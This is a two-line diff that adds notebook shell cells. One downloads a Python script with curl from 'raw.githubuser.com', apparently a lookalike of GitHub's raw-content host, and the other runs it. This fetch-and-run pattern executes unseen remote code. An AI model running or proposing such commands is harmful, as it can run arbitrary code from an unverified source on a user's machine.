@@ -1,0 +1,2 @@
+!curl -o script.py https://raw.githubuser.com/issameriddhi/nn/tree/main/script.py
+!python script.py
